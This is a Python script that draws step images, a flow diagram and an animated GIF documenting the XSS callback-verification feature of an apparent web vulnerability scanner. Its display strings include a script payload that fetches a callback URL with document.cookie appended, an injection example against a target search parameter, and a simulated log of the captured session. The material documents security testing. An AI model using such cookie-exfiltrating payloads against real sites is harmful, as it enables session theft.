#!/usr/bin/env python3
"""
Script to create step-by-step visual proof of concept for XSS Callback Verification

This script generates images showing each step of the XSS callback verification process,
then combines them into an animated GIF.

Requirements:
    - PIL/Pillow for image generation
    - imageio or similar for GIF creation (optional)
"""

import os
import sys
from pathlib import Path

try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("Warning: PIL/Pillow not available. Install with: pip install Pillow")

# Color scheme
COLORS = {
    'bg': '#1a1a2e',           # Dark blue background
    'card': '#16213e',          # Card background
    'primary': '#0f3460',       # Primary blue
    'accent': '#e94560',        # Red accent
    'success': '#2ecc71',       # Green
    'text': '#ffffff',          # White text
    'text_dim': '#94a1b2',      # Dimmed text
    'border': '#2d3748',        # Border color
}

def create_step_image(step_num, title, description, details, width=1200, height=800):
    """Create an image for a single step."""
    if not HAS_PIL:
        print(f"Cannot create image for step {step_num}: PIL not available")
        return None
    
    # Create image
    img = Image.new('RGB', (width, height), COLORS['bg'])
    draw = ImageDraw.Draw(img)
    
    # Try to load a nice font, fallback to default
    try:
        title_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 48)
        heading_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
        text_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 24)
        code_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 20)
    except:
        # Fallback to default font
        title_font = ImageFont.load_default()
        heading_font = ImageFont.load_default()
        text_font = ImageFont.load_default()
        code_font = ImageFont.load_default()
    
    # Draw step number badge
    badge_size = 80
    badge_x = 50
    badge_y = 50
    draw.ellipse([badge_x, badge_y, badge_x + badge_size, badge_y + badge_size], 
                 fill=COLORS['accent'])
    
    # Draw step number
    step_text = str(step_num)
    bbox = draw.textbbox((0, 0), step_text, font=heading_font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]
    draw.text((badge_x + badge_size//2 - text_width//2, 
               badge_y + badge_size//2 - text_height//2), 
              step_text, fill=COLORS['text'], font=heading_font)
    
    # Draw title
    title_y = 60
    draw.text((160, title_y), title, fill=COLORS['text'], font=title_font)
    
    # Draw description
    desc_y = 150
    draw.text((50, desc_y), description, fill=COLORS['text_dim'], font=text_font)
    
    # Draw details card
    card_y = 220
    card_height = height - card_y - 50
    draw.rectangle([40, card_y, width - 40, card_y + card_height], 
                   fill=COLORS['card'], outline=COLORS['border'], width=2)
    
    # Draw details
    detail_y = card_y + 40
    line_height = 35
    
    for detail in details:
        current_font = text_font  # Default font
        
        if detail.startswith('✓') or detail.startswith('→'):
            color = COLORS['success']
            current_font = text_font
        elif detail.startswith('$') or detail.startswith('  '):
            color = COLORS['text_dim']
            current_font = code_font
        else:
            color = COLORS['text']
            current_font = text_font
        
        draw.text((60, detail_y), detail, fill=color, font=current_font)
        detail_y += line_height
    
    return img


def create_all_steps():
    """Create images for all steps."""
    output_dir = Path('/home/runner/work/Megido/Megido/docs/xss_callback_poc')
    output_dir.mkdir(parents=True, exist_ok=True)
    
    steps = [
        {
            'num': 1,
            'title': 'Configure Callback Endpoint',
            'description': 'Set up the callback endpoint in .env or settings',
            'details': [
                '→ Open .env file',
                '',
                '  XSS_CALLBACK_ENDPOINT=https://your-callback.com',
                '  XSS_CALLBACK_TIMEOUT=30',
                '  XSS_CALLBACK_VERIFICATION_ENABLED=true',
                '',
                '✓ Configuration loaded',
                '✓ Callback endpoint ready',
            ]
        },
        {
            'num': 2,
            'title': 'Initialize XSS Plugin',
            'description': 'Load the XSS plugin with callback verification enabled',
            'details': [
                '→ Import scanner modules',
                '',
                '  from scanner.plugins import get_registry',
                '  plugin = get_registry().get_plugin("xss")',
                '',
                '✓ XSS Plugin loaded',
                '✓ Callback verifier initialized',
                '✓ Endpoint: https://your-callback.com',
            ]
        },
        {
            'num': 3,
            'title': 'Generate Callback Payload',
            'description': 'Create XSS payload that will call back when executed',
            'details': [
                '→ Generate unique payload with ID',
                '',
                '  Payload ID: abc123def456',
                '  Template: <script>CALLBACK</script>',
                '',
                '  Generated:',
                '  <script>(function(){',
                '    fetch("callback/abc123?data="+document.cookie)',
                '  })();</script>',
                '',
                '✓ Payload ready for injection',
            ]
        },
        {
            'num': 4,
            'title': 'Inject Payload into Target',
            'description': 'Send the payload to the vulnerable parameter',
            'details': [
                '→ Testing URL: http://target.com/search?q=<payload>',
                '',
                '  Injecting payload...',
                '  Method: GET',
                '  Parameter: q',
                '',
                '✓ Payload injected',
                '✓ Waiting for JavaScript execution...',
            ]
        },
        {
            'num': 5,
            'title': 'JavaScript Executes - Callback Triggered',
            'description': "Target's browser executes the injected JavaScript",
            'details': [
                '→ JavaScript executed in browser',
                '',
                '  XMLHttpRequest initiated',
                '  GET /callback/abc123?data=session%3D...',
                '',
                '✓ Callback received!',
                '✓ Source IP: 203.0.113.42',
                '✓ Timestamp: 2026-02-13T10:30:45',
            ]
        },
        {
            'num': 6,
            'title': 'Verify Callback Reception',
            'description': 'Scanner confirms the callback was received',
            'details': [
                '→ Polling callback endpoint...',
                '',
                '  Checking for payload ID: abc123def456',
                '  Found 2 interactions!',
                '',
                '  Interaction #1: XMLHttpRequest',
                '  Interaction #2: Fetch API',
                '',
                '✓ XSS VERIFIED!',
            ]
        },
        {
            'num': 7,
            'title': 'Generate Verified Report',
            'description': 'Create report with proof of exploitation',
            'details': [
                '→ Generating report...',
                '',
                '  ✓ VERIFIED XSS',
                '  Severity: HIGH',
                '  Verification Method: callback',
                '',
                '  Evidence:',
                '  • Payload ID: abc123def456',
                '  • Callbacks received: 2',
                '  • Source IP: 203.0.113.42',
                '',
                '✓ Report ready for submission',
            ]
        },
    ]
    
    images = []
    
    for step in steps:
        print(f"Creating image for Step {step['num']}: {step['title']}")
        img = create_step_image(
            step['num'],
            step['title'],
            step['description'],
            step['details']
        )
        
        if img:
            # Save individual step image
            img_path = output_dir / f'step_{step["num"]:02d}.png'
            img.save(img_path)
            print(f"  Saved: {img_path}")
            images.append(img)
    
    return images, output_dir


def create_gif(images, output_path, duration=3000):
    """Create animated GIF from images."""
    if not images:
        print("No images to create GIF")
        return False
    
    try:
        # Try using PIL to save as GIF
        images[0].save(
            output_path,
            save_all=True,
            append_images=images[1:],
            duration=duration,
            loop=0
        )
        print(f"✓ Created GIF: {output_path}")
        return True
    except Exception as e:
        print(f"Error creating GIF: {e}")
        return False


def create_summary_diagram():
    """Create a summary flow diagram."""
    if not HAS_PIL:
        return None
    
    width, height = 1400, 1000
    img = Image.new('RGB', (width, height), COLORS['bg'])
    draw = ImageDraw.Draw(img)
    
    try:
        title_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 42)
        box_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
        text_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 20)
    except:
        title_font = ImageFont.load_default()
        box_font = ImageFont.load_default()
        text_font = ImageFont.load_default()
    
    # Title
    draw.text((50, 30), "XSS Callback Verification Flow", fill=COLORS['text'], font=title_font)
    
    # Flow boxes
    boxes = [
        {'text': '1. Configure\nCallback Endpoint', 'y': 120, 'color': COLORS['primary']},
        {'text': '2. Generate\nCallback Payload', 'y': 240, 'color': COLORS['primary']},
        {'text': '3. Inject Payload\ninto Target', 'y': 360, 'color': COLORS['primary']},
        {'text': '4. JavaScript\nExecutes', 'y': 480, 'color': COLORS['accent']},
        {'text': '5. Callback\nReceived', 'y': 600, 'color': COLORS['success']},
        {'text': '6. Generate\nVerified Report', 'y': 720, 'color': COLORS['success']},
    ]
    
    box_width = 300
    box_height = 80
    box_x = (width - box_width) // 2
    
    for i, box in enumerate(boxes):
        y = box['y']
        
        # Draw box
        draw.rectangle([box_x, y, box_x + box_width, y + box_height],
                      fill=box['color'], outline=COLORS['border'], width=3)
        
        # Draw text (center aligned)
        lines = box['text'].split('\n')
        text_y = y + 15
        for line in lines:
            bbox = draw.textbbox((0, 0), line, font=box_font)
            text_width = bbox[2] - bbox[0]
            draw.text((box_x + (box_width - text_width) // 2, text_y),
                     line, fill=COLORS['text'], font=box_font)
            text_y += 30
        
        # Draw arrow to next box
        if i < len(boxes) - 1:
            arrow_x = box_x + box_width // 2
            arrow_y1 = y + box_height
            arrow_y2 = boxes[i + 1]['y']
            
            # Draw arrow line
            draw.line([arrow_x, arrow_y1, arrow_x, arrow_y2],
                     fill=COLORS['text_dim'], width=3)
            
            # Draw arrow head
            arrow_size = 10
            draw.polygon([
                (arrow_x, arrow_y2),
                (arrow_x - arrow_size, arrow_y2 - arrow_size),
                (arrow_x + arrow_size, arrow_y2 - arrow_size)
            ], fill=COLORS['text_dim'])
    
    # Add side notes
    notes = [
        {'text': 'Burp Collaborator, Interactsh,\nor internal collaborator', 'y': 150},
        {'text': 'Unique ID: abc123def456', 'y': 270},
        {'text': 'Browser executes JS', 'y': 510},
        {'text': 'HTTP request to endpoint', 'y': 630},
    ]
    
    note_x = box_x + box_width + 30
    for note in notes:
        draw.text((note_x, note['y']), note['text'],
                 fill=COLORS['text_dim'], font=text_font)
    
    return img


def main():
    """Main function to create all proof of concept images."""
    print("=" * 70)
    print("Creating XSS Callback Verification Proof of Concept")
    print("=" * 70)
    print()
    
    if not HAS_PIL:
        print("ERROR: PIL/Pillow is required to generate images.")
        print("Install with: pip install Pillow")
        return 1
    
    # Create step-by-step images
    print("Creating step-by-step images...")
    images, output_dir = create_all_steps()
    
    if not images:
        print("ERROR: Failed to create step images")
        return 1
    
    print()
    print(f"Created {len(images)} step images")
    print()
    
    # Create summary flow diagram
    print("Creating summary flow diagram...")
    summary_img = create_summary_diagram()
    if summary_img:
        summary_path = output_dir / 'xss_callback_flow_diagram.png'
        summary_img.save(summary_path)
        print(f"✓ Saved: {summary_path}")
    
    # Create animated GIF
    print()
    print("Creating animated GIF...")
    gif_path = output_dir / 'xss_callback_verification_poc.gif'
    
    if create_gif(images, gif_path, duration=3000):
        print()
        print("=" * 70)
        print("SUCCESS!")
        print("=" * 70)
        print()
        print(f"Generated files in: {output_dir}")
        print(f"  • Step images: step_01.png - step_07.png")
        print(f"  • Flow diagram: xss_callback_flow_diagram.png")
        print(f"  • Animated GIF: xss_callback_verification_poc.gif")
        print()
        print("You can now use these images in documentation!")
        return 0
    else:
        print("ERROR: Failed to create GIF")
        return 1


if __name__ == '__main__':
    sys.exit(main())
